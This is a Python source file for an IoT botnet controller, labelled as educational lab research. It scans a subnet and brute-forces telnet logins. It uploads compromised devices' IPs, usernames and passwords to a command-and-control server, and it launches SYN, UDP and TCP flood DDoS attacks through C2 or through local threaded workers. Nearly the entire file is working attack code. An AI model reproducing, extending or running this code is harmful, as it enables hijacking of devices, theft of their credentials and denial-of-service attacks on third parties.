#!/usr/bin/env python3
"""
IoT Security Research - Main Exploit Script (Optimized)
Educational Purpose Only - For Controlled Lab Environment

This is the main entry point that orchestrates all IoT security research operations
using modular components for better maintainability and code organization.
Performance optimizations:
- Streamlined execution flow
- Reduced C2 communication overhead
- Efficient data caching
- Faster brute-force operations
"""

import sys
import os
import argparse
import logging
import time
import json
import socket
import subprocess
import telnetlib
import platform
import requests
from datetime import datetime

# Add modules directory to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

# Import modular components
from modules.network_scanner import NetworkScanner
from modules.telnet_bruteforcer import TelnetBruteForcer
from modules.c2_communicator import C2Communicator
from modules.user_interface import UserInterface
from credentials import get_credentials

# Try to import high-performance C extensions
try:
    import fast_ddos_attack
    DDOS_C_EXTENSION = True
    print("[INFO] Fast DDoS C extension loaded - maximum performance mode enabled")
except ImportError:
    DDOS_C_EXTENSION = False
    print("[INFO] DDoS C extension not available - using Python fallback")

try:
    import fast_telnet_bruteforce
    TELNET_C_EXTENSION = True
    print("[INFO] Fast telnet C extension loaded")
except ImportError:
    TELNET_C_EXTENSION = False
    print("[INFO] Telnet C extension using Python mode")

# Configure logging with performance optimizations
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()  # Remove file handler for performance
    ]
)

class IoTExploiterOptimized:
    """Optimized main orchestrator class for high-performance IoT security research"""
    
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.subnet = subnet or "11.10.10.0/24"
        
        # Initialize logger
        self.logger = logging.getLogger(__name__)
        
        # Initialize modular components
        self.scanner = NetworkScanner(self.subnet, self.logger)
        self.bruteforcer = TelnetBruteForcer(self.logger)
        self.c2_comm = C2Communicator(cnc_server_ip, self.logger)
        self.ui = UserInterface(self.logger)
        
        # Data storage with caching
        self.scan_results = []
        self.compromised_devices = []
        self.last_c2_sync = 0  # Timestamp for C2 sync optimization
        self.c2_sync_interval = 30  # Sync with C2 every 30 seconds
        
        self.log("IoT Exploiter (Optimized) initialized successfully")
    
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.logger.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices"""
        self.log("Starting optimized network scan...")
        start_time = time.time()
        
        self.scan_results = self.scanner.scan_network()
        
        elapsed_time = time.time() - start_time
        self.log(f"Network scan completed in {elapsed_time:.2f}s - found {len(self.scan_results)} targets")
        
        # Batch upload scan results to C2 (more efficient than individual uploads)
        if self.scan_results:
            self._batch_upload_scan_results()
        
        return self.scan_results
    
    def brute_force_telnet(self):
        """Optimized brute force telnet credentials for discovered devices"""
        if not self.scan_results:
            self.log("No scan results available. Please run a scan first.")
            return []
        
        self.log("Starting optimized telnet brute-force...")
        start_time = time.time()
        
        # Use the optimized brute forcer
        self.compromised_devices = self.bruteforcer.brute_force_telnet(self.scan_results)
        
        elapsed_time = time.time() - start_time
        success_count = len(self.compromised_devices)
        self.log(f"Brute-force completed in {elapsed_time:.2f}s - {success_count} devices compromised")
        
        # Batch register with C2 server (more efficient than individual registrations)
        if self.compromised_devices:
            self._batch_register_devices()
        
        return self.compromised_devices
    
    def _batch_upload_scan_results(self):
        """Efficiently upload all scan results to C2 server in a single request"""
        try:
            self.log("Batch uploading scan results to C2 server...")
            
            response = requests.post(
                f"{self.c2_comm.cnc_url}/batch-add-scan-results",
                json={'scan_results': self.scan_results},
                timeout=10
            )
            
            if response.status_code == 200:
                self.log(f"[SUCCESS] Batch uploaded {len(self.scan_results)} scan results to C2")
            else:
                self.log(f"[FAIL] Batch upload failed. Status: {response.status_code}")
                
        except Exception as e:
            self.log(f"[FAIL] Error batch uploading scan results: {e}")
    
    def _batch_register_devices(self):
        """Efficiently register all compromised devices with C2 server in a single request"""
        try:
            self.log("Batch registering compromised devices with C2 server...")
            
            # Prepare device data for batch registration
            device_data = []
            for device in self.compromised_devices:
                device_data.append({
                    'ip': device['ip'],
                    'username': device['username'],
                    'password': device['password'],
                    'status': 'online',
                    'device_type': device.get('device_type', 'unknown'),
                    'timestamp': device['timestamp']
                })
            
            response = requests.post(
                f"{self.c2_comm.cnc_url}/batch-register-devices",
                json={'devices': device_data},
                timeout=15
            )
            
            if response.status_code == 200:
                result = response.json()
                successful_count = result.get('successful_count', 0)
                failed_count = result.get('failed_count', 0)
                
                # Update local device registration status
                for device in self.compromised_devices:
                    device['registered_c2'] = True  # Assume success for batch operations
                
                self.log(f"[SUCCESS] Batch registered devices: {successful_count} successful, {failed_count} failed")
            else:
                self.log(f"[FAIL] Batch registration failed. Status: {response.status_code}")
                
        except Exception as e:
            self.log(f"[FAIL] Error batch registering devices: {e}")
    
    def start_ddos_via_c2(self):
        """Start DDoS attack via C2 server with user interaction"""
        if not self.compromised_devices:
            self.log("No compromised devices available. Please run brute-force first.")
            return
        
        target_ip = self.ui.get_user_input("Enter target IP to attack: ")
        if not target_ip:
            return
        
        attack_type = self.ui.get_user_input(
            "Enter attack type (syn/rtsp/mqtt): ", 
            ['syn', 'rtsp', 'mqtt']
        )
        if not attack_type:
            return
        
        success, result = self.c2_comm.start_ddos_via_c2(target_ip, attack_type)
        
        if success:
            self.log("DDoS attack initiated successfully")
            if result:
                successful_ips = result.get('successful_ips', [])
                failed_ips = result.get('failed_ips', {})
                self.log(f"Attack results: {len(successful_ips)} successful, {len(failed_ips)} failed")
        else:
            self.log("Failed to initiate DDoS attack")
    
    def stop_ddos_via_c2(self):
        """Stop DDoS attack via C2 server"""
        success, result = self.c2_comm.stop_ddos_via_c2()
        
        if success:
            self.log("DDoS attack stopped successfully")
        else:
            self.log("Failed to stop DDoS attack")
    
    def start_high_performance_ddos(self, target_ip, target_port=80, duration=30, attack_type='udp'):
        """High-performance DDoS attack using C extension for maximum speed"""
        self.log(f"🚀 Starting high-performance DDoS attack on {target_ip}:{target_port}")
        
        if DDOS_C_EXTENSION:
            self.log("Using C extension for maximum performance...")
            
            # Configure attack parameters
            thread_count = 50  # Use maximum threads for performance
            packet_size = 1024  # Larger packets for more impact
            
            # Map attack types
            attack_type_map = {
                'udp': 0,
                'tcp': 1,
                'syn': 1,
                'icmp': 2
            }
            
            attack_type_num = attack_type_map.get(attack_type.lower(), 0)
            
            try:
                # Start C-based DDoS attack
                start_time = time.time()
                result = fast_ddos_attack.start_attack(
                    target_ip=target_ip,
                    target_port=target_port,
                    duration=duration,
                    threads=thread_count,
                    packet_size=packet_size,
                    attack_type=attack_type_num
                )
                
                elapsed_time = time.time() - start_time
                packets_sent = result.get('packets_sent', 0)
                packets_per_second = packets_sent / elapsed_time if elapsed_time > 0 else 0
                
                self.log(f"✅ DDoS attack completed:")
                self.log(f"   Duration: {elapsed_time:.2f}s")
                self.log(f"   Packets sent: {packets_sent:,}")
                self.log(f"   Rate: {packets_per_second:,.0f} packets/second")
                self.log(f"   Threads used: {thread_count}")
                
                return True, result
                
            except Exception as e:
                self.log(f"❌ C extension DDoS attack failed: {e}")
                return False, str(e)
        else:
            self.log("⚠️  C extension not available - using fallback Python implementation")
            return self._python_ddos_fallback(target_ip, target_port, duration, attack_type)
    
    def _python_ddos_fallback(self, target_ip, target_port, duration, attack_type):
        """Python fallback implementation for DDoS attacks"""
        self.log("Using Python fallback for DDoS attack...")
        
        import socket
        import threading
        import time
        from concurrent.futures import ThreadPoolExecutor
        
        packets_sent = 0
        stop_attack = False
        
        def udp_flood_worker():
            nonlocal packets_sent, stop_attack
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"A" * 1024  # 1KB payload
            
            while not stop_attack:
                try:
                    sock.sendto(data, (target_ip, target_port))
                    packets_sent += 1
                except:
                    pass
                time.sleep(0.001)  # Small delay
            sock.close()
        
        def tcp_syn_worker():
            nonlocal packets_sent, stop_attack
            while not stop_attack:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect_ex((target_ip, target_port))
                    packets_sent += 1
                    sock.close()
                except:
                    pass
                time.sleep(0.001)
        
        try:
            start_time = time.time()
            thread_count = 20
            
            # Choose worker function based on attack type
            worker_func = udp_flood_worker if attack_type.lower() == 'udp' else tcp_syn_worker
            
            # Start attack threads
            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                futures = [executor.submit(worker_func) for _ in range(thread_count)]
                
                # Run for specified duration
                time.sleep(duration)
                stop_attack = True
                
                # Wait for threads to complete
                for future in futures:
                    try:
                        future.result(timeout=1)
                    except:
                        pass
            
            elapsed_time = time.time() - start_time
            packets_per_second = packets_sent / elapsed_time if elapsed_time > 0 else 0
            
            self.log(f"✅ Python DDoS attack completed:")
            self.log(f"   Duration: {elapsed_time:.2f}s")
            self.log(f"   Packets sent: {packets_sent:,}")
            self.log(f"   Rate: {packets_per_second:,.0f} packets/second")
            
            return True, {
                'packets_sent': packets_sent,
                'duration': elapsed_time,
                'threads': thread_count,
                'attack_type': attack_type
            }
            
        except Exception as e:
            self.log(f"❌ Python DDoS attack failed: {e}")
            return False, str(e)

    def stop_ddos_via_c2(self):
        """Stop DDoS attack via C2 server"""
        success, result = self.c2_comm.stop_ddos_via_c2()
        
        if success:
            self.log("DDoS attack stopped successfully")
        else:
            self.log("Failed to stop DDoS attack")
    
    def print_status(self):
        """Print current status"""
        c2_connected = self._check_c2_connection_cached()
        self.ui.print_status(self.scan_results, self.compromised_devices, c2_connected)
    
    def _check_c2_connection_cached(self):
        """Check C2 connection with caching to reduce overhead"""
        current_time = time.time()
        
        # Use cached connection status if checked recently
        if hasattr(self, '_last_c2_check') and (current_time - self._last_c2_check) < 10:
            return getattr(self, '_cached_c2_status', False)
        
        # Check connection and cache result
        try:
            response = requests.get(f"{self.c2_comm.cnc_url}/", timeout=2)
            self._cached_c2_status = response.status_code == 200
        except:
            self._cached_c2_status = False
        
        self._last_c2_check = current_time
        return self._cached_c2_status
    
    def save_results(self, prefix="results"):
        """Save results to files"""
        return self.ui.save_results(self.scan_results, self.compromised_devices, prefix)
    
    def sync_with_c2(self, force=False):
        """Efficiently sync data with C2 server (with intelligent caching)"""
        current_time = time.time()
        
        # Skip sync if done recently (unless forced)
        if not force and (current_time - self.last_c2_sync) < self.c2_sync_interval:
            return
        
        self.log("Syncing data with C2 server...")
        
        # Fetch data from C2 in a single efficient call
        try:
            response = requests.get(f"{self.c2_comm.cnc_url}/get-all-data", timeout=10)
            if response.status_code == 200:
                data = response.json()
                
                # Update scan results
                c2_scan_results = data.get('scan_results', [])
                if c2_scan_results:
                    self.scan_results = c2_scan_results
                
                # Update compromised devices
                c2_devices = data.get('compromised_devices', [])
                if c2_devices:
                    self.compromised_devices = c2_devices
                
                self.log(f"Synced: {len(self.scan_results)} scan results, {len(self.compromised_devices)} devices")
                self.last_c2_sync = current_time
                
        except Exception as e:
            self.log(f"Sync with C2 failed: {e}")
    
    def interactive_menu(self):
        """Optimized interactive menu with improved performance"""
        while True:
            self.ui.clear_screen()
            self.ui.print_banner()
            
            # Efficient data sync (cached)
            self.sync_with_c2()
            
            self.ui.print_menu()
            
            choice = self.ui.get_user_input("Enter your choice (1-9): ", 
                                          ['1', '2', '3', '4', '5', '6', '7', '8', '9'])
            
            if choice is None:  # User pressed Ctrl+C
                break
            
            if choice == '1':
                self.scan_network()
                
            elif choice == '2':
                self.brute_force_telnet()
                
            elif choice == '3':
                self.start_ddos_via_c2()
                
            elif choice == '4':
                self.stop_ddos_via_c2()
                
            elif choice == '5':
                self.print_status()
                
            elif choice == '6':
                if self.save_results():
                    self.log("Results saved successfully")
                else:
                    self.log("Failed to save results")
                    
            elif choice == '7':
                self.sync_with_c2(force=True)  # Force refresh
                
            elif choice == '8':
                self._handle_advanced_options()
                
            elif choice == '9':
                confirm = self.ui.get_user_input("Are you sure you want to exit? (y/n): ", ['y', 'n'])
                if confirm == 'y':
                    self.log("Exiting...")
                    break
            
            if choice != '9':
                input("\nPress Enter to continue...")
    
    def _handle_advanced_options(self):
        """Handle advanced options menu"""
        while True:
            self.ui.print_advanced_menu()
            choice = self.ui.get_user_input("Enter choice (1-7): ", ['1', '2', '3', '4', '5', '6', '7'])
            
            if choice == '1':
                new_cnc = self.ui.get_user_input(f"Enter new C2 server IP (current: {self.cnc_server_ip}): ")
                if new_cnc:
                    self.cnc_server_ip = new_cnc
                    self.c2_comm = C2Communicator(new_cnc, self.logger)
                    self.log(f"✅ C2 server address updated to {new_cnc}")
            
            elif choice == '2':
                print("\nCredentials List:")
                credentials = self.bruteforcer.credentials
                for i, (username, password) in enumerate(credentials, 1):
                    print(f"{i}. '{username}':'{password}'")
            
            elif choice == '3':
                self._test_device_connectivity()
            
            elif choice == '4':
                self._export_devices_csv()
            
            elif choice == '5':
                self.ui.explain_registration_status()
            
            elif choice == '6':
                # Configure performance settings
                self._configure_performance_settings()
            
            elif choice == '7':
                break
            
            input("\nPress Enter to continue...")
    
    def _configure_performance_settings(self):
        """Configure performance optimization settings"""
        print("\n🚀 Performance Configuration:")
        print(f"1. Thread count (current: {self.bruteforcer.max_threads})")
        print(f"2. C2 sync interval (current: {self.c2_sync_interval}s)")
        print(f"3. Fast mode (current: {'ON' if self.bruteforcer.use_fast_mode else 'OFF'})")
        print("4. Back to advanced menu")
        
        choice = self.ui.get_user_input("Enter choice (1-4): ", ['1', '2', '3', '4'])
        
        if choice == '1':
            new_threads = self.ui.get_user_input(f"Enter thread count (1-50, current: {self.bruteforcer.max_threads}): ")
            if new_threads and new_threads.isdigit():
                thread_count = int(new_threads)
                if 1 <= thread_count <= 50:
                    self.bruteforcer.max_threads = thread_count
                    self.log(f"Thread count set to {thread_count}")
        
        elif choice == '2':
            new_interval = self.ui.get_user_input(f"Enter sync interval in seconds (5-300, current: {self.c2_sync_interval}): ")
            if new_interval and new_interval.isdigit():
                interval = int(new_interval)
                if 5 <= interval <= 300:
                    self.c2_sync_interval = interval
                    self.log(f"C2 sync interval set to {interval}s")
        
        elif choice == '3':
            if hasattr(self.bruteforcer, 'use_fast_mode'):
                self.bruteforcer.use_fast_mode = not self.bruteforcer.use_fast_mode
                status = "ON" if self.bruteforcer.use_fast_mode else "OFF"
                self.log(f"Fast mode turned {status}")
    
    def _test_device_connectivity(self):
        """Test connectivity to compromised devices"""
        if not self.compromised_devices:
            self.log("❌ No compromised devices to test")
            return
        
        self.log("Testing device connectivity...")
        for device in self.compromised_devices:
            ip = device['ip']
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, 23))
                s.close()
                self.log(f"✅ {ip} is reachable on port 23")
                device['status'] = 'online'
            except:
                self.log(f"❌ {ip} is not reachable on port 23")
                device['status'] = 'offline'
    
    def _export_devices_csv(self):
        """Export compromised devices to CSV"""
        if not self.compromised_devices:
            self.log("❌ No compromised devices to export")
            return
        
        filename = self.ui.get_user_input("Enter CSV filename (default: compromised_devices.csv): ")
        if not filename:
            filename = "compromised_devices.csv"
        
        try:
            with open(filename, 'w') as f:
                f.write("IP,Username,Password,Status,Registered_C2\n")
                for device in self.compromised_devices:
                    f.write(f"{device['ip']},{device['username']},{device['password']},{device.get('status', 'unknown')},{device.get('registered_c2', False)}\n")
            self.log(f"✅ Exported {len(self.compromised_devices)} devices to {filename}")
        except Exception as e:
            self.log(f"❌ Error exporting to CSV: {e}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Optimized Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    parser.add_argument('--threads', type=int, default=20, help='Number of threads for brute force (default: 20)')
    parser.add_argument('--fast', action='store_true', help='Enable fast mode (requires C extension)')
    args = parser.parse_args()
    
    # Create and run optimized exploiter
    exploiter = IoTExploiterOptimized(args.cnc, args.subnet)
    
    # Configure performance settings from command line
    if args.threads:
        exploiter.bruteforcer.max_threads = args.threads
    
    if args.fast and hasattr(exploiter.bruteforcer, 'use_fast_mode'):
        exploiter.bruteforcer.use_fast_mode = True
    
    try:
        # Test C2 connection first
        if exploiter._check_c2_connection_cached():
            exploiter.log("✅ Successfully connected to C2 server")
        else:
            exploiter.log("⚠️ Warning: Cannot connect to C2 server. Some features may not work.")
        
        # Start interactive menu
        exploiter.interactive_menu()
        
    except KeyboardInterrupt:
        exploiter.log("Interrupted by user")
    except Exception as e:
        exploiter.log(f"Unexpected error: {e}")
    finally:
        exploiter.log("Exploit script terminated")


if __name__ == "__main__":
    main()
